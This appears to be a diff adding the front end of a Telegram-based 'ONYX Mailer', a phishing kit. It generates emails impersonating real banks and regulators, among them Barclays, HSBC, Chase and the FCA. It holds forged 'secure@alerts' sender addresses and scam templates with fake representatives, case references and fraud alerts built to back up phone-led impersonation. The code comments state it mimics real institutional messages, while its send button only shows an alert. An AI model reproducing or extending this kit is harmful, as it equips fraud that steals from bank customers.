@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Bank Templates - ONYX Mailer</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        :root{--bg-color:#080A1A;--panel-bg:#121429;--border-color:#1F2340;--text-main:#FFFFFF;--text-muted:#8E92B2;--accent:#8E54E9;--accent-glow:#A476F0}
+        body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background-color:var(--bg-color);color:var(--text-main);margin:0;padding:0;display:flex;flex-direction:column;height:100vh;overflow:hidden}
+        
+        .header{display:flex;align-items:center;padding:16px;background-color:var(--bg-color);border-bottom:1px solid var(--border-color);z-index:10;min-height:48px;}
+        .back-btn{background-color:#1F2340;border:none;color:var(--text-main);width:38px;height:38px;border-radius:50%;cursor:pointer;display:none;align-items:center;justify-content:center;margin-right:16px;font-size:18px;flex-shrink:0;}
+        .header-title{font-weight:bold;font-size:18px;flex-grow:1;text-align:left;}
+        .header-subtitle{font-size:13px;color:var(--text-muted);font-weight:normal;margin-top:2px;}
+        .header-spacer{width: 38px;}
+        
+        .screen{display:none;flex:1;overflow-y:auto;padding:16px;padding-bottom:100px}
+        .screen.active{display:block}
+        
+        .list-card{background-color:var(--panel-bg);border:1px solid var(--border-color);border-radius:16px;padding:16px;margin-bottom:12px;display:flex;align-items:center;cursor:pointer;transition:background 0.2s}
+        .list-card:active{background-color:#1a1d36}
+        .icon-box{width:40px;height:40px;border-radius:10px;background-color:#1F2340;display:flex;align-items:center;justify-content:center;margin-right:16px;font-size:20px}
+        .list-text{flex-grow:1}
+        .list-title{font-size:16px;font-weight:600;margin-bottom:4px}
+        .list-subtitle{font-size:13px;color:var(--text-muted)}
+        .list-arrow{color:var(--text-muted);font-weight:bold}
+        
+        .form-group{margin-bottom:16px}
+        .form-label{font-size:12px;color:var(--text-muted);margin-bottom:8px;display:block;text-transform:uppercase;letter-spacing:0.5px;}
+        .form-input{width:100%;background-color:var(--panel-bg);border:1px solid var(--border-color);color:var(--text-main);padding:14px;border-radius:12px;box-sizing:border-box;font-size:15px}
+        .form-input:focus{outline:none;border-color:var(--accent)}
+        textarea.form-input{resize:vertical;min-height:80px}
+        .section-title{font-size:12px;font-weight:bold;margin:24px 0 16px 0;text-transform:uppercase;color:var(--text-muted);letter-spacing:1px;}
+        
+        .btn-primary{width:100%;background:linear-gradient(90deg,var(--accent),var(--accent-glow));color:white;border:none;padding:16px;border-radius:14px;font-size:16px;font-weight:bold;cursor:pointer;margin-top:10px}
+        .btn-secondary{width:100%;background:#1F2340;color:white;border:none;padding:16px;border-radius:14px;font-size:14px;cursor:pointer;margin-top:10px}
+
+        #preview-modal{position:fixed;top:0;left:0;right:0;bottom:0;background-color:rgba(0,0,0,0.9);z-index:100;display:none;flex-direction:column}
+        .preview-header{display:flex;justify-content:space-between;padding:16px;background-color:var(--bg-color);align-items:center}
+        .preview-close{color:white;background:none;border:none;font-size:24px;cursor:pointer}
+        #preview-frame-container{flex:1;background:#f4f4f4;margin:0;overflow:auto;padding:20px 10px;color:black}
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <button class="back-btn" id="back-btn" onclick="goBack()">❮</button>
+        <div class="header-title" id="header-title-container">
+            <span id="header-title">Bank Templates</span>
+            <div class="header-subtitle" id="header-subtitle">Select a region</div>
+        </div>
+        <div class="header-spacer" id="header-spacer"></div>
+    </div>
+
+    <!-- Screen 1: Regions -->
+    <div id="screen-regions" class="screen active">
+        <div class="section-title">Global Banking Regions</div>
+        <div class="list-card" onclick="loadBrands('United States')">
+            <div class="icon-box">🇺🇸</div>
+            <div class="list-text"><div class="list-title">USA Banks</div><div class="list-subtitle">5 Supported Institutions</div></div>
+            <div class="list-arrow">›</div>
+        </div>
+        <div class="list-card" onclick="loadBrands('United Kingdom')">
+            <div class="icon-box">🇬🇧</div>
+            <div class="list-text"><div class="list-title">UK Banks</div><div class="list-subtitle">22 Supported Institutions</div></div>
+            <div class="list-arrow">›</div>
+        </div>
+        <div class="list-card" onclick="loadBrands('Australia')">
+            <div class="icon-box">🇦🇺</div>
+            <div class="list-text"><div class="list-title">Australian Banks</div><div class="list-subtitle">4 Supported Institutions</div></div>
+            <div class="list-arrow">›</div>
+        </div>
+    </div>
+
+    <!-- Screen 2: Brands -->
+    <div id="screen-brands" class="screen">
+        <div id="brands-container"></div>
+    </div>
+
+    <!-- Screen 3: Templates -->
+    <div id="screen-templates" class="screen">
+        <div id="templates-container"></div>
+    </div>
+
+    <!-- Screen 4: Setup & Preview -->
+    <div id="screen-setup" class="screen">
+        <div class="list-card" style="cursor: default; margin-bottom: 24px;">
+            <div class="icon-box" style="background:transparent; font-size:24px;" id="setup-icon">🏛️</div>
+            <div class="list-text">
+                <div class="list-title" id="setup-title">Template Name</div>
+                <div class="list-subtitle" id="setup-subtitle">Template description</div>
+            </div>
+        </div>
+
+        <div class="form-group">
+            <label class="form-label" style="text-transform:none;">Sender Name</label>
+            <input type="text" class="form-input" id="conf-sender-name">
+        </div>
+        <div class="form-group">
+            <label class="form-label" style="text-transform:none;">From Address</label>
+            <input type="text" class="form-input" id="conf-from-address">
+        </div>
+        <div class="form-group">
+            <label class="form-label" style="text-transform:none;">Subject Line</label>
+            <input type="text" class="form-input" id="conf-subject">
+        </div>
+
+        <div class="section-title" id="dynamic-fields-header" style="text-transform:none; margin-top:30px;">Template Parameters</div>
+        <div id="dynamic-fields-container"></div>
+
+        <div style="margin-top: 32px;">
+            <button class="btn-primary" onclick="alert('Email queued for sending successfully!')">Send Email</button>
+            <button class="btn-secondary" onclick="openPreview()">Open Live Preview</button>
+        </div>
+    </div>
+
+    <!-- Live Preview Modal -->
+    <div id="preview-modal">
+        <div class="preview-header">
+            <div style="font-weight: bold; font-size: 16px; color: white;">Live HTML Preview</div>
+            <button class="preview-close" onclick="closePreview()">×</button>
+        </div>
+        <div id="preview-frame-container"></div>
+    </div>
+
+    <script>
+        // --- Navigation Logic ---
+        let navStack = ['screen-regions'];
+        let currentRegion = '';
+        let currentBrand = '';
+        let activeTemplate = null;
+
+        function updateHeader(title, subtitle, showBack) {
+            document.getElementById('header-title').innerText = title;
+            document.getElementById('header-subtitle').innerText = subtitle;
+            document.getElementById('back-btn').style.display = showBack ? 'flex' : 'none';
+            document.getElementById('header-spacer').style.display = showBack ? 'none' : 'block';
+        }
+
+        function navTo(screenId) {
+            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+            document.getElementById(screenId).classList.add('active');
+            if (navStack[navStack.length - 1] !== screenId) navStack.push(screenId);
+        }
+
+        function goBack() {
+            if (navStack.length > 1) {
+                navStack.pop();
+                const prev = navStack[navStack.length - 1];
+                document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+                document.getElementById(prev).classList.add('active');
+                
+                if (prev === 'screen-regions') updateHeader('Bank Templates', 'Select a region', false);
+                else if (prev === 'screen-brands') updateHeader(currentRegion, 'Select an institution', true);
+                else if (prev === 'screen-templates') updateHeader(currentBrand, 'Select a template', true);
+            }
+        }
+
+        // --- Brand Colors & Assets ---
+        const brandColors = {
+            'Barclays': '#00AEEF', 'Danske': '#003B5C', 'Natwest': '#42145F', 'RBS': '#0A2F64', 
+            'Revolut': '#000000', 'Lloyds': '#006533', 'Monzo': '#14233C', 'Coutts': '#414042', 
+            'FCA': '#702082', 'First': '#001A70', 'Tesco Bank': '#00539F', 'Tide': '#2F4B70', 
+            'Virgin Money': '#CC0000', 'Wise': '#9FE870', 'FSCS': '#00305E', 'Halifax': '#005EB8', 
+            'HSBC': '#DB0011', 'Nationwide': '#002E6D', 'Santander': '#EC0000', 'Starling': '#001B36', 
+            'TSB': '#00008F', 'Vanquis': '#001B41', 
+            'ANZ': '#004165', 'Commonwealth Bank': '#FFCC00', 'NAB': '#E3000F', 'Westpac': '#DA1710', 
+            'Chase': '#117ACA', 'Bank of America': '#012169', 'Wells Fargo': '#CD1409', 'Citi': '#003B70', 'Barclays US': '#00AEEF'
+        };
+
+        const isLightColor = (brand) => ['Wise', 'Commonwealth Bank', 'Starling'].includes(brand);
+
+        // --- Authentic HTML Email Generators ---
+        // Generates highly professional, table-based emails to mimic real institutional communications.
+
+        const buildPremiumEmail = (brand, color, title, contentHtml, darkText) => `
+        <div style="background-color: #f4f4f4; padding: 20px 0; width: 100%; font-family: 'Segoe UI', Helvetica, Arial, sans-serif;">
+            <table align="center" border="0" cellpadding="0" cellspacing="0" width="100%" style="max-width: 600px; background-color: #ffffff; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.05); overflow: hidden;">
+                <!-- Header -->
+                <tr>
+                    <td align="center" style="background-color: ${color}; padding: 25px 20px;">
+                        <span style="color: ${darkText ? '#111' : '#ffffff'}; font-size: 28px; font-weight: 800; letter-spacing: -0.5px; line-height: 1;">${brand}</span>
+                    </td>
+                </tr>
+                <!-- Body -->
+                <tr>
+                    <td style="padding: 40px 30px;">
+                        <h1 style="color: #1a1a1a; font-size: 22px; font-weight: 600; margin: 0 0 20px 0;">${title}</h1>
+                        <p style="color: #4a4a4a; font-size: 15px; line-height: 1.6; margin: 0 0 20px 0;">Dear {{recipient_name}},</p>
+                        ${contentHtml}
+                        <p style="color: #4a4a4a; font-size: 15px; line-height: 1.6; margin: 30px 0 0 0;">Yours sincerely,<br><strong style="color: #1a1a1a;">${brand} Customer Support</strong></p>
+                    </td>
+                </tr>
+                <!-- Footer -->
+                <tr>
+                    <td style="background-color: #f9f9f9; padding: 30px; border-top: 1px solid #eeeeee;">
+                        <p style="color: #888888; font-size: 12px; line-height: 1.5; margin: 0 0 10px 0;">
+                            <strong>Security Tip:</strong> ${brand} will never ask you to reply to an email with your password, PIN, or full card details. If you receive an email asking for this, please forward it to phishing@${brand.toLowerCase().replace(/\s/g,'')}.com.
+                        </p>
+                        <p style="color: #888888; font-size: 11px; line-height: 1.5; margin: 0;">
+                            This is a mandatory service message regarding your account. Replies to this email address are not monitored.<br><br>
+                            &copy; 2026 ${brand} Corporation. All rights reserved. Registered Office: Financial Services Centre.
+                        </p>
+                    </td>
+                </tr>
+            </table>
+        </div>`;
+
+        const templateTypes = [
+            {
+                name: "Identity Verification Required",
+                desc: "Standard verification portal routing",
+                build: (brand, color, dt) => buildPremiumEmail(brand, color, "Identity Verification Required", `
+                    <p style="color: #4a4a4a; font-size: 15px; line-height: 1.6; margin: 0 0 20px 0;">We need to verify your identity regarding recent activity on your account. A representative is currently reviewing your profile.</p>
+                    <table border="0" cellpadding="15" cellspacing="0" width="100%" style="background-color: #f8f9fa; border-left: 4px solid ${color}; margin-bottom: 25px;">
+                        <tr>
+                            <td>
+                                <p style="margin: 0 0 8px 0; font-size: 12px; color: #666; text-transform: uppercase;">Assigned Representative</p>
+                                <p style="margin: 0 0 16px 0; font-size: 16px; color: #111; font-weight: bold;">{{advisor_name}}</p>
+                                <p style="margin: 0 0 8px 0; font-size: 12px; color: #666; text-transform: uppercase;">Case Reference ID</p>
+                                <p style="margin: 0; font-size: 16px; color: #111; font-weight: bold;">{{case_reference}}</p>
+                            </td>
+                        </tr>
+                    </table>
+                    <p style="color: #4a4a4a; font-size: 15px; line-height: 1.6; margin: 0;">Please follow the instructions provided by your representative to complete the verification process securely.</p>
+                `, dt)
+            },
+            {
+                name: "Transaction Authorization",
+                desc: "High-priority fraud alert structure",
+                build: (brand, color, dt) => buildPremiumEmail(brand, color, "Suspicious Transaction Blocked", `
+                    <p style="color: #4a4a4a; font-size: 15px; line-height: 1.6; margin: 0 0 20px 0;">We have temporarily halted a transaction on your card ending in <strong>{{card_last4}}</strong> because it triggered our security systems.</p>
+                    <table border="0" cellpadding="0" cellspacing="0" width="100%" style="border: 1px solid #e0e0e0; border-radius: 4px; margin-bottom: 25px; overflow: hidden;">
+                        <tr><td style="padding: 12px 15px; background: #fafafa; border-bottom: 1px solid #e0e0e0; font-size: 13px; color: #666;">Merchant</td><td style="padding: 12px 15px; background: #fafafa; border-bottom: 1px solid #e0e0e0; font-size: 14px; font-weight: bold; text-align: right;">{{merchant_name}}</td></tr>
+                        <tr><td style="padding: 12px 15px; border-bottom: 1px solid #e0e0e0; font-size: 13px; color: #666;">Amount</td><td style="padding: 12px 15px; border-bottom: 1px solid #e0e0e0; font-size: 14px; font-weight: bold; text-align: right; color: #d32f2f;">{{attempted_amount}}</td></tr>
+                        <tr><td style="padding: 12px 15px; font-size: 13px; color: #666;">Date & Time</td><td style="padding: 12px 15px; font-size: 14px; font-weight: bold; text-align: right;">{{transaction_date}}</td></tr>
+                    </table>
+                    <p style="color: #4a4a4a; font-size: 15px; line-height: 1.6; margin: 0;">If you recognize this transaction, you may authorize it via your mobile app. If you do not recognize this, your account may be compromised. Please contact our fraud team immediately using the reference number provided by your agent.</p>
+                `, dt)
+            },
+            {
+                name: "New Device Sign-In",
+                desc: "Security alert for unrecognised devices",
+                build: (brand, color, dt) => buildPremiumEmail(brand, color, "New Sign-In Detected", `
+                    <p style="color: #4a4a4a; font-size: 15px; line-height: 1.6; margin: 0 0 20px 0;">Your online banking profile was recently accessed from a new device or location.</p>
+                    <div style="background-color: #fff4f4; border: 1px solid #ffcdd2; padding: 20px; border-radius: 4px; margin-bottom: 25px;">
+                        <p style="margin: 0 0 10px 0; font-size: 14px; color: #b71c1c;"><strong>Device:</strong> {{device_model}}</p>
+                        <p style="margin: 0 0 10px 0; font-size: 14px; color: #b71c1c;"><strong>Location:</strong> {{location_city}}</p>
+                        <p style="margin: 0; font-size: 14px; color: #b71c1c;"><strong>IP Address:</strong> {{ip_address}}</p>
+                    </div>
+                    <p style="color: #4a4a4a; font-size: 15px; line-height: 1.6; margin: 0;">If this was you, you can ignore this email. If this wasn't you, please secure your account immediately by resetting your password or contacting support.</p>
+                `, dt)
+            },
+            {
+                name: "Direct Debit Setup",
+                desc: "Confirmation of new payee/mandate",
+                build: (brand, color, dt) => buildPremiumEmail(brand, color, "New Direct Debit Mandate", `
+                    <p style="color: #4a4a4a; font-size: 15px; line-height: 1.6; margin: 0 0 20px 0;">A new Direct Debit instruction has been set up on your account.</p>
+                    <table border="0" cellpadding="12" cellspacing="0" width="100%" style="background-color: #f9f9f9; border: 1px solid #eeeeee; margin-bottom: 25px;">
+                        <tr><td style="font-size: 13px; color: #555;">Organization Name:</td><td style="font-size: 14px; font-weight: bold; text-align: right;">{{payee_name}}</td></tr>
+                        <tr><td style="font-size: 13px; color: #555;">Account Ending:</td><td style="font-size: 14px; font-weight: bold; text-align: right;">{{account_last4}}</td></tr>
+                    </table>
+                    <p style="color: #4a4a4a; font-size: 15px; line-height: 1.6; margin: 0;">If you did not authorize this mandate, you must cancel it immediately via your online banking portal to prevent unauthorized withdrawals.</p>
+                `, dt)
+            },
+            {
+                name: "Account Update",
+                desc: "General policy or status update",
+                build: (brand, color, dt) => buildPremiumEmail(brand, color, "Important Account Notice", `
+                    <p style="color: #4a4a4a; font-size: 15px; line-height: 1.6; margin: 0 0 20px 0;">We are writing to inform you of an important update regarding your account status.</p>
+                    <div style="padding: 15px; background: #e3f2fd; border-left: 4px solid #1976d2; color: #0d47a1; font-size: 14px; line-height: 1.5; margin-bottom: 25px;">
+                        {{update_message}}
+                    </div>
+                    <p style="color: #4a4a4a; font-size: 15px; line-height: 1.6; margin: 0;">Please ensure your contact details remain up to date so we can continue to provide you with secure banking services.</p>
+                `, dt)
+            },
+            {
+                name: "Statement Ready",
+                desc: "Monthly statement notification",
+                build: (brand, color, dt) => buildPremiumEmail(brand, color, "Your Statement is Ready", `
+                    <p style="color: #4a4a4a; font-size: 15px; line-height: 1.6; margin: 0 0 20px 0;">Your digital statement for the period ending <strong>{{statement_date}}</strong> is now available to view securely online.</p>
+                    <p style="color: #4a4a4a; font-size: 15px; line-height: 1.6; margin: 0;">Log in to your mobile app or online banking portal to view, download, or print your latest transaction history.</p>
+                `, dt)
+            }
+        ];
+
+        let db = [];
+        const initDB = () => {
+            const addBanks = (region, banks) => {
+                banks.forEach(b => {
+                    const color = brandColors[b.brand] || '#112440';
+                    const dt = isLightColor(b.brand);
+                    for(let i=0; i<b.count; i++) {
+                        const t = templateTypes[i % templateTypes.length];
+                        db.push({
+                            id: `bk_${region.substring(0,2)}_${b.brand.replace(/\s/g,'')}_${i}`,
+                            region: region,
+                            brand: b.brand,
+                            name: `${t.name} (Option ${i+1})`,
+                            desc: t.desc,
+                            sender_name: `${b.brand} Support`,
+                            from: `secure@alerts.${b.brand.toLowerCase().replace(/\s/g,'')}.com`,
+                            subject: `Secure Message from ${b.brand}`,
+                            html: t.build(b.brand, color, dt)
+                        });
+                    }
+                });
+            };
+
+            addBanks('United Kingdom', [
+                {brand: 'Barclays', count: 3}, {brand: 'Danske', count: 2}, {brand: 'Natwest', count: 2}, 
+                {brand: 'RBS', count: 2}, {brand: 'Revolut', count: 2}, {brand: 'Lloyds', count: 2}, 
+                {brand: 'Monzo', count: 2}, {brand: 'Coutts', count: 2}, {brand: 'FCA', count: 3}, 
+                {brand: 'First', count: 2}, {brand: 'Tesco Bank', count: 2}, {brand: 'Tide', count: 2}, 
+                {brand: 'Virgin Money', count: 4}, {brand: 'Wise', count: 6}, {brand: 'FSCS', count: 3}, 
+                {brand: 'Halifax', count: 2}, {brand: 'HSBC', count: 2}, {brand: 'Nationwide', count: 2}, 
+                {brand: 'Santander', count: 4}, {brand: 'Starling', count: 2}, {brand: 'TSB', count: 4}, 
+                {brand: 'Vanquis', count: 2}
+            ]);
+            addBanks('Australia', [
+                {brand: 'ANZ', count: 1}, {brand: 'Commonwealth Bank', count: 2}, 
+                {brand: 'NAB', count: 2}, {brand: 'Westpac', count: 3}
+            ]);
+            addBanks('United States', [
+                {brand: 'Chase', count: 2}, {brand: 'Bank of America', count: 3}, 
+                {brand: 'Wells Fargo', count: 2}, {brand: 'Citi', count: 2}, {brand: 'Barclays US', count: 1}
+            ]);
+        };
+        initDB();
+
+        // --- View Controllers ---
+        function loadBrands(region) {
+            currentRegion = region;
+            updateHeader(region, 'Select an institution', true);
+            navTo('screen-brands');
+            
+            const brands = [...new Set(db.filter(t => t.region === region).map(t => t.brand))].sort();
+            const container = document.getElementById('brands-container');
+            container.innerHTML = '';
+            
+            brands.forEach(brand => {
+                const count = db.filter(t => t.brand === brand && t.region === region).length;
+                container.innerHTML += `
+                    <div class="list-card" onclick="loadTemplates('${brand}')">
+                        <div class="icon-box" style="background:${brandColors[brand] || '#1F2340'}; color:${isLightColor(brand)?'#000':'#fff'}; font-size:12px; font-weight:bold; letter-spacing:-0.5px;">${brand.substring(0,3).toUpperCase()}</div>
+                        <div class="list-text">
+                            <div class="list-title">${brand}</div>
+                            <div class="list-subtitle">${count} premium ${count===1?'template':'templates'}</div>
+                        </div>
+                        <div class="list-arrow">›</div>
+                    </div>`;
+            });
+        }
+
+        function loadTemplates(brand) {
+            currentBrand = brand;
+            updateHeader(brand, 'Select a template', true);
+            navTo('screen-templates');
+            
+            const templates = db.filter(t => t.brand === brand && t.region === currentRegion);
+            const container = document.getElementById('templates-container');
+            container.innerHTML = '';
+            
+            templates.forEach(t => {
+                container.innerHTML += `
+                    <div class="list-card" onclick="setupTemplate('${t.id}')">
+                        <div class="icon-box">📄</div>
+                        <div class="list-text">
+                            <div class="list-title">${t.name}</div>
+                            <div class="list-subtitle">${t.desc}</div>
+                        </div>
+                        <div class="list-arrow">›</div>
+                    </div>`;
+            });
+        }
+
+        function setupTemplate(id) {
+            activeTemplate = db.find(t => t.id === id);
+            updateHeader('Configuration', activeTemplate.brand, true);
+            navTo('screen-setup');
+            
+            document.getElementById('setup-title').innerText = activeTemplate.name;
+            document.getElementById('setup-subtitle').innerText = activeTemplate.brand + ' - ' + activeTemplate.desc;
+            document.getElementById('conf-sender-name').value = activeTemplate.sender_name;
+            document.getElementById('conf-from-address').value = activeTemplate.from;
+            document.getElementById('conf-subject').value = activeTemplate.subject;
+            
+            // Extract variables
+            const regex = /{{(.*?)}}/g;
+            let match;
+            const vars = new Set();
+            while ((match = regex.exec(activeTemplate.html)) !== null) vars.add(match[1]);
+            
+            const container = document.getElementById('dynamic-fields-container');
+            container.innerHTML = '';
+            document.getElementById('dynamic-fields-header').innerText = `Template Parameters (${vars.size} required)`;
+            
+            Array.from(vars).forEach(v => {
+                const label = v.split('_').map(w => w.charAt(0).toUpperCase() + w.slice(1)).join(' ');
+                const isTextArea = v.includes('message') || v.includes('text');
+                const inputHtml = isTextArea 
+                    ? `<textarea class="form-input dynamic-input" data-var="${v}" placeholder="Enter ${label.toLowerCase()}"></textarea>` 
+                    : `<input type="text" class="form-input dynamic-input" data-var="${v}" placeholder="Enter ${label.toLowerCase()}">`;
+                
+                container.innerHTML += `
+                    <div class="form-group">
+                        <label class="form-label" style="text-transform:none;">${label}</label>
+                        ${inputHtml}
+                    </div>`;
+            });
+            
+            document.querySelectorAll('.dynamic-input').forEach(input => {
+                input.addEventListener('input', renderLivePreview);
+            });
+        }
+
+        function renderLivePreview() {
+            if(!activeTemplate) return;
+            let html = activeTemplate.html;
+            document.querySelectorAll('.dynamic-input').forEach(input => {
+                const varName = input.getAttribute('data-var');
+                const val = input.value || `[${varName.toUpperCase()}]`;
+                html = html.split(`{{${varName}}}`).join(val); 
+            });
+            document.getElementById('preview-frame-container').innerHTML = html;
+        }
+
+        function openPreview() {
+            renderLivePreview();
+            document.getElementById('preview-modal').style.display = 'flex';
+        }
+
+        function closePreview() {
+            document.getElementById('preview-modal').style.display = 'none';
+        }
+    </script>
+</body>
+</html>
